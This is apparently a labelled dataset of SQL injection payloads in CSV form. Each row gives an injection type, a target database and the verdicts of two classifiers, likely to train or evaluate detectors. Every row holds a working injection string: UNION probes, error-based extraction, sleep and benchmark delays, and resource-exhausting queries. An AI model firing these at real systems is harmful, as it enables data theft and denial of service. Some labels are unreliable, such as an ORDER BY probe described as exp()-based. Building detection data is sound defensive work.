payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1' ) and ( 7603 = 3634 ) *3634,boolean_blind,generic,0.75,Multiplication comparison for blind,KEEP,,boolean_blind,generic,410,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1' ) and ( 7603 = 3634 ) *3634
"1%"" ) ) and 7533 = 7533 and ( ( ""%"" = """,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,411,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) ) and 7533 = 7533 and ( ( ""%"" = """
-3834' ) ) as hhiy where 2086 = 2086 or 3038 = 3038,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,412,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3834' ) ) as hhiy where 2086 = 2086 or 3038 = 3038
"-7371' ) union all select 4531,4531,4531#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,413,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7371' ) union all select 4531,4531,4531#"
select ( case when ( 1039 = 5127 ) then 1039 else 1039* ( select 1039 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,414,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 1039 = 5127 ) then 1039 else 1039* ( select 1039 from information_schema.character_sets ) end ) #
select case when 1574 = 5523 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,415,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 1574 = 5523 then 1 else null end--
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",error_based,mysql,0.85,extractvalue() for error extraction,KEEP,,error_based,mysql,416,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nimx' = 'nimx",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,417,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nimx' = 'nimx"
"1'|| ( select 'kojx' from dual where 8140 = 8140 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,418,time_blind,oracle,Pattern match: 'benchmark (' → time_blind (P5); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'kojx' from dual where 8140 = 8140 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
select ( case when ( 2161 = 4328 ) then 2161 else 2161* ( select 2161 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,419,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 2161 = 4328 ) then 2161 else 2161* ( select 2161 from mysql.db ) end ) #
"-9854 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 5696 = 5696",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,420,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-9854 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 5696 = 5696"
1' ) ) as kahn where 1361 = 1361 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,421,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) ) as kahn where 1361 = 1361 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
"1' union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,422,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' union all select null,null,null,null--"
"-3596' ) union all select 5349,5349,5349,5349,5349,5349#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,423,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3596' ) union all select 5349,5349,5349,5349,5349,5349#"
"1"" ) ) as uaxn where 5657 = 5657 rlike ( select ( case when ( 3548 = 7206 ) then 1 else 0x28 end ) ) --",boolean_blind,mysql,0.8,rlike() for boolean blind,KEEP,,boolean_blind,mysql,424,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) as uaxn where 5657 = 5657 rlike ( select ( case when ( 3548 = 7206 ) then 1 else 0x28 end ) ) --"
"-4670"" ) ) or 3038 = 3038",boolean_blind,generic,0.8,OR equality for boolean blind,KEEP,,boolean_blind,generic,425,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4670"" ) ) or 3038 = 3038"
"1' in boolean mode ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,426,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' in boolean mode ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #"
1' ) where 2753 = 2753 and ( 2739 = 8047 ) *8047--,boolean_blind,generic,0.75,Multiplication for boolean blind,KEEP,,boolean_blind,generic,427,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 2753 = 2753 and ( 2739 = 8047 ) *8047--
-3921' ) as audo where 7087 = 7087 or 1755 = 4937--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,428,boolean_blind,generic,Pattern match: 'or 1755 = 4937' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3921' ) as audo where 7087 = 7087 or 1755 = 4937--
"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,429,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--"
1' ) as llug where 2244 = 2244 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.8,IN with char concatenation for blind,KEEP,,boolean_blind,generic,430,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) as llug where 2244 = 2244 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
"1' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,431,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
-7187' or 4159 = 7465,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,432,boolean_blind,generic,Pattern match: 'or 4159 = 7465' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7187' or 4159 = 7465
select ( case when ( 3855 = 3855 ) then 3855 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,433,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 3855 = 3855 ) then 3855 else 1/ ( select 0 ) end ) --
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,434,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp"
"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,435,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok"
1' ) where 6622 = 6622 order by 1--,error_based,mysql,0.85,exp() with concat for error extraction,KEEP,,error_based,mysql,436,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 6622 = 6622 order by 1--
"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,437,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'"
"-7813"" ) ) as yvyl where 5172 = 5172 union all select 5172,5172#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,438,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7813"" ) ) as yvyl where 5172 = 5172 union all select 5172,5172#"
select ( case when ( 4111 = 1992 ) then 4111 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,439,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4111 = 1992 ) then 4111 else 1/ ( select 0 ) end ) --
"select count ( * ) from generate_series ( 1,5000000 ) and ""xcjt"" = ""xcjt",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,440,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ""xcjt"" = ""xcjt"
1' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,441,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --
-5918' ) as olzc where 5992 = 5992 or 4390 = 9085,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,442,boolean_blind,generic,Pattern match: 'or 4390 = 9085' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5918' ) as olzc where 5992 = 5992 or 4390 = 9085
"-9795 ) as wrgs where 5427 = 5427 union all select 5427,5427,5427,5427,5427,5427--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,443,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9795 ) as wrgs where 5427 = 5427 union all select 5427,5427,5427,5427,5427,5427--"
1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,444,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --
"-5243"" where 2105 = 2105 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,445,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"-5243"" where 2105 = 2105 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""ulfr"" like ""ulfr",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,446,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""ulfr"" like ""ulfr"
"1'+ ( select 'rryx' where 1228 = 1228 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,447,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select 'rryx' where 1228 = 1228 union all select null,null,null,null,null,null,null,null,null#"
1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 3945 = 3945,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,448,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 3945 = 3945
"1 ) as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,449,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#"
"-5827"" ) as lskq where 7683 = 7683 union all select 7683,7683,7683,7683,7683#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,450,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5827"" ) as lskq where 7683 = 7683 union all select 7683,7683,7683,7683,7683#"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) ||'",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,451,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) ||'"
"-3697' ) ) ) union all select 5180,5180,5180,5180,5180,5180,5180--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,452,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3697' ) ) ) union all select 5180,5180,5180,5180,5180,5180,5180--"
1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'smrw' like 'smrw,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,453,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'smrw' like 'smrw
1' and 5967 = 4184#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,454,boolean_blind,generic,Pattern match: 'and 5967 = 4184' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' and 5967 = 4184#
1' where 7191 = 7191 rlike sleep ( 5 ) --,time_blind,generic,0.85,sleep() with rlike for time blind,KEEP,,time_blind,generic,455,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' where 7191 = 7191 rlike sleep ( 5 ) --
"1' ) ) and make_set ( 8245 = 9872,9872 ) and ( ( 'kzgt' = 'kzgt",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,456,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' ) ) and make_set ( 8245 = 9872,9872 ) and ( ( 'kzgt' = 'kzgt"
